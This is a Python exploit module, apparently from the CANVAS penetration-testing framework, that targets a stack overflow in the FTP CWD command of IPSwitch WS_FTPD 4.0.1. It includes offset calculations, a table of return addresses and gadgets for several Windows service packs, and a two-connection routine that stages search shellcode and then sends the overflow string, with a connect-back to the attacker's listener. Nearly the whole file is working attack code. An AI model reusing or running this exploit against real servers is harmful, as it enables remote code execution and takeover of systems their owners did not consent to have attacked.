#! /usr/bin/env python


# CANVAS WS_FTPD 4.0.1 exploit
#
# Bug Class: Stack overflow
# 

import sys
if "." not in sys.path: sys.path.append(".")

# CANVAS modules
from exploitutils import *
from tcpexploit import *

# GUI info
NAME="WS_FTPD"
DESCRIPTION="WS_FTPD Stack Overflow"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="IPSwitch"
DOCUMENTATION["Date public"] = "Not public - fixed in 4.0.2 though."
DOCUMENTATION["References"] = "http://www.ipswitch.com/products/ws_ftp-server/"
DOCUMENTATION["Repeatability"]="You get one shot - use ExitThread after you finish to let it continue to work and you can use it over and over."
DOCUMENTATION["CVE Name"] = "Unknown"
DOCUMENTATION["CVE Url"] = "Unknown"

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000" ]
PROPERTY['AUTOHACK_EXCLUDE'] = True

NOTES="""
Payload:
    CWD [attack string] with variable eip loc influenced by
    len(username) && len(host)
    
    Attention!:
        
    len(ftphost) initially did not seem to influence the base
    offset, however, this offset is influenced by the base dir
    of the server, now normally this will be C:\IFTPSVC\TOPDIR\STRING
    where TOPDIR is equal to the hostname (yes dave was right!)
    
    Now for a full eip tag we need 269 bytes, with a base of 0
    our eiploc in the string becomes 265, with a hostlen of 15
    and a userlen of 4 it becomes 246. etc. etc.
    So 0 base is 265. We will assume "IFTPSVC" as a constant, as
    we have no way of reliably knowing any different, we will assume
    the banner hostname as the to use hostlen, as this is the safest
    guess. One can imagine this is not one of the most reliable 
    attacks ever put together.
    
    However there is another hitch, the max used len in our attack
    string is 256 bytes, so with f.ex. an offset base of 12 we end
    up only generating a 268 overflow string and only hitting the 
    last 3 bytes of eip, this can also used in our advantage as we
    will be able to hit a 0x00AABBCC range on LE machines
    
    For now we're using 3 byte tag, as it produced the most reliable
    results, no obvious avenue for cross SP abuse in the WS_FTPD DLLs yet
       
Requirements:
    This attack requires a valid login on the ftpd, anonymous
    access is enough, no write permissions needed

Development notes:
    LIBEAY32.DLL that comes with WS_FTPD has a CALL EBP so if one
    is so inclined, you'd always be able to leverage a 3 byte eip
    overwrite into a full 4 byte jmploc control. You'd still need
    a minimum offset base of 12 ofcourse. 
    
    LIBEAY32.DLL has a addl ADD ESP,94 followed by a RETN. This add
    points our ESP into the searchcode nops @ 0x0023432f
    
    At 0x00234E6D we find:
        ADD ESP,20
        MOV EAX,ESI
        POP ESI
        ADD ESP,5C
        RETN
    
    Using the above we get an offset of ESP into the next instance of
    our initial shellcode buffer, this is at an offset of 23 with a 
    base offset off 14, so with a base offset of 0 the jmpesp offset
    becomes 37, so by pointing eip at the above we can pop a pointer
    to a jmp esp and get our searchcode executed, oi vey

 """
CHANGELOG="""
"""

# name, eip, jmpesp
# eip should be cross SP static as it comes from a WS_FTPD 4.0.1 specific DLL

targets = {
    0 : ["N/A", 0x00000000],
    1 : ["Windows 2000 Professional SP0, NL, SHLWAPI.DLL", 0x41234E6D, 0x77C916A7],
    2 : ["Windows 2000 Professional SP1, NL, SHLWAPI.DLL", 0x41234E6D, 0x77C8E51F],
    3 : ["Windows 2000 Professional SP2, NL, SHLWAPI.DLL", 0x41234E6D, 0x77C8E797],
    4 : ["Windows 2000 Professional SP3, NL, SHLWAPI.DLL", 0x41234E6D, 0x77C8F3DF],
    5 : ["Windows 2000 Professional SP4, NL, SHLWAPI.DLL", 0x41234E6D, 0x77C8F2C7],
    6 : ["Windows 2003 Professional SP0, EN", 0x41234E6D, 0x71AE1F9B],
    7 : ["Crash target", 0x41424344, 0x45464748] 
          }

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name=NAME
        self.setInfo(DESCRIPTION)
        self.host = "192.168.0.6"
        self.port = 21
        # targets default version
        self.version = 1
        # where eip is located in overflow string
        # with a base of 0, eiploc is 265 (on w2k SP4)
        # with a base of 0, jmpesploc is 37
        self.eiploc = 265
        self.jmpesploc = 37
        self.info, self.eip, self.jmpesp = targets[self.version]
        # shellcode place holders 
        self.shellcode = "A" * 2048
        self.encodedsearchcode = "A" * 200
        # chars to exclude in shellcode generation
        self.badstring = "\x00\\/.:\r\n?\x20\t"
        self.searchbadstring = self.badstring
        # localhost and localport used in shellcode
        self.localhost = "127.0.0.1"
        self.localport = 5000
        # ftp login info
        self.user = "ABCD"
        self.password = "password"
        # check version, if enabled there will be a pedantic 
        # version check on the banner, optional for flexibility
        self.checkversion = 1
        # used for search shellcode, CANVAS engine will call our createShellcode
        # this calls createWin32SearchShellcode, which in turn sets two shellcodes
        # a self.encodedsearchcode and a self.shellcode which is the main payload
        self.tag1 = "ABBA"
        self.tag2 = "BAAB"
        # use SSL ?
        self.ssl = 0
        return
    
    # satisfy API
    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]

    def connect_to_host(self, t_host, t_port):
        s = self.gettcpsock()
        try:
            s.connect((t_host, t_port))
        except:
            return 0
        return s

    def getHostlen(self, t_host, t_port):
        s = self.connect_to_host(self.host, self.port)
        if s == 0:
            return 0
        else:
            try:
                response = s.recv(256, 0)
            except:
                self.log("Timeout on recv")
                return 0
            print "Got: " + response
            # Format: 220-HOSTNAME X2 etc.
            self.log("Calculating remote host length")
            # sorry, I'm not that familiar with python yet 
            # get first space
            len = 0
            i = 4
            while response[i] != " ":
                len = len + 1
                i = i + 1
            s.close()
            return len     
   
    def test(self):
        result = 0
        s = self.connect_to_host(self.host, self.port)
        if s == 0:
            return 0
        else:
            try:
                response = s.recv(256, 0)
            except:
                self.log("Timeout on recv")
                return 0
            if response.count("WS_FTP"):
                print "Received WS_FTP banner"
                result = 1
                # check version
                if self.checkversion:
                    if response.count("4.0.1"):
                        self.log("Vulnerable WS_FTP version found")
                    else:
                        self.log("No WS_FTP version determined")
                        result = 0
                
                s.close()
                return result
            else:
                self.log("No WS_FTPD banner found")
                return 0
    
    def createShellcode(self):
        host = self.callback.ip
        port = self.callback.port
        return self.createWin32SearchShellcode(host, port)
    
    def ftpLogin(self, s, ftp_user, ftp_pass, expectfail = 0):
        s.send("USER %s\r\n"% ftp_user)
        try:
            response = s.recv(256, 0)
        except:
            self.log("ftpLogin timeout?")
            return 0
        s.send("PASS %s\r\n"% ftp_pass)
        try:
            response = s.recv(256, 0)
        except:
            self.log("ftpLogin timeout?") 
            return 0
        if response.count("530 "):
            if expectfail:
                self.log("Expected login failure, keeping FTP connection open")
                return 0
            else:
                # be nice
                s.send("QUIT\r\n")
                self.log("FTP login failed")
            return 0
        if response.count("230 "):
            self.log("FTP login succeeded")
            return 1
        self.log("Response Unexpected, pretending it worked: %s"%response)
        #pretend it worked anyways
        return 1
    
    def buildString(self, x_len, eipoffset, espoffset, retadd, jmpespadd):
        hostlen = self.getHostlen(self.host, self.port)
        self.log("Host len: %d"% hostlen)
        
        base = len(self.user)
        base += hostlen
        self.log("Offset base: %d"% base)
     
        if base == 12:
            self.log("Exisiting base is perfect for 3 byte EIP tag")
        if base < 12:
            self.log("Base < 12: this will not work, we'll try anyways")
        # we're using 3 byte tags as the main modus operandi for the time being    
        # if base > 12 we offset the diff to keep the 3 byte tag
        # not using x_len for the time being
        eipoffset = eipoffset - base
        espoffset = espoffset - base
        
        x_string = "A" * eipoffset
        
        jmpesp = intel_order(jmpespadd)
        tag = intel_order(retadd)
        
        # place the jmp esp addie
        x_string = stroverwrite(x_string, jmpesp, espoffset)
        
        # the three tag bytes (le)
        x_string += tag[0]
        x_string += tag[1]
        x_string += tag[2]
                
        self.log("Using eip offset: %d (diffed for 3 byte tag)"% eipoffset)
        # place searchcode, allow some nop space
        x_string = stroverwrite(x_string, self.encodedsearchcode, eipoffset - 4 - len(self.encodedsearchcode))
        # x_string = stroverwrite(x_string, intel_order(retadd), eipoffset)
        return x_string
    
    def run(self):
        if "user" in self.argsDict:
            self.user = self.argsDict["user"]
        if "password" in self.argsDict:
            self.password = self.argsDict["password"]

        self.host = self.target.interface
        if "port" in self.argsDict:
            self.port = int(self.argsDict["port"])

        self.setInfo("%s attacking %s:%d (in progress)"% (NAME, self.host, self.port))

        if self.version == 0:
            self.log("Auto versioning not available")
            self.setInfo("%s attacking %s:%d - done (failed!)"% (NAME, self.host, self.port))
            return 0

        self.info, self.eip, self.jmpesp = targets[self.version]

        print "Using version %d : %s (0x%X)"% (self.version, self.info, self.eip)
        x_string = self.buildString(256, self.eiploc, self.jmpesploc, self.eip, self.jmpesp)
        
        DEBUG=""" """
        # experimenting with seperate payload connection
        ps = self.connect_to_host(self.host, self.port)
        if ps == 0:
            self.setInfo("%s attacking %s:%d - done (failed!)"% (NAME, self.host, self.port))
            self.log("Could not connect to %s:%d"% (self.host, self.port))
            return 0     
        # Load main shellcode
        # we hold on to the searchcode in the kill dump for now
        # might come in handy for any cross platform trickery
        if self.ftpLogin(ps, self.user, self.password):
            payload = "A" * 56 + "\xeb\xe8" + self.shellcode + "\r\n"
            self.websend(ps, payload)
     
        # Go for the kill
        s = self.connect_to_host(self.host, self.port)
        if s == 0:
            self.setInfo("%s attacking %s:%d - done (failed!)"% (NAME, self.host, self.port))
            self.log("Could not connect to %s:%d"% (self.host, self.port))
            return 0     
        if self.ftpLogin(s, self.user, self.password):
            kill = "CWD " + x_string + "\r\n"
            self.websend(s, kill)
        else:
            self.log("Could not log in!\n")
            self.setInfo("%s attacking %s:%d - done (failed!)"% (NAME, self.host, self.port))
        
        self.log("We're using searchcode, this may take some time")   
        s.close()
        import time
        self.log("Sleeping three seconds")
        time.sleep(3)
        self.log("Waking up")
        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d - done (succeeded!)"% (NAME, self.host, self.port))
        else:
            self.setInfo("%s attacking %s:%d - done (failed!)"% (NAME, self.host, self.port))            
        
        ps.close()
        self.log("Exploit finished.")
        self.setState("done")
        return self.ISucceeded()

    def usage(self):
        print "Usage: "+sys.argv[0]+" -v version -t target -l localhost -d localip [ -p port ]"
        print "Login: -O user:username -O password:password"
        i = 0
        for line in targets.values():
            print "\t%d : %s"%(i, line[0])
            i += 1
   
if __name__== '__main__':
    print "Running CANVAS "+NAME+" version "+VERSION
    app = theexploit()
    ret=standard_callback_commandline(app)
        
                
                  


    
        
    
    
